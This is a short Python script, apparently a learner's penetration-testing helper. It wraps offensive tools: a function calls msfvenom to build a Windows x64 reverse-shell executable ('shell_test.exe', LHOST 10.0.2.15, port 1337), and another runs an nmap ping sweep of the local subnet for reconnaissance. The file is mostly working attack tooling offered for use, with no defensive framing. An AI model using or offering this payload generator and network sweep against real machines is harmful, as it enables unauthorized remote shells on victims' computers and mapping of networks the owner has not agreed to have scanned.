#!/usr/bin/env python3                # specify the interpreter


### IMPORT STATEMENTS ###
import sys  # import the sys library
import subprocess # import the subprocess library
import socket # import the socket library


### HELPER FUNCTIONS ###
def get_local():  # calls ifconfig
    return_code = subprocess.call(['ifconfig'])
    print("output:", return_code)

def list_payloads(): # lists all the msfvenom payloads
    return_code = subprocess.call(['msfvenom','-l','payloads'])
    print("output:", return_code)

def windows_reverse_payload(): # creates a payload for a windows machine with all the options hard coded
    return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
    print("output:", return_code)

def get_ip(): # gets ip address of local computer
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    return ip_address
    #print(s.getsockname()[0])

def ping_sweep(): # does a sweep of the local network using 
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_address = s.getsockname()[0]
    ipremoved =''.join(local_address.rpartition('.')[:2])
    subnet = ipremoved + "1-255"
    return_code = subprocess.call(['nmap','-sP',subnet])
    return return_code
    #print("output:", return_code)


### MAIN FUNCTION ###
def main():  # define a main function
    pinging = ping_sweep()
    print(pinging)
    print(get_ip())


### DUNDER CHECK ###
if __name__ == '__main__':  # dunder check
    main()  # call the main function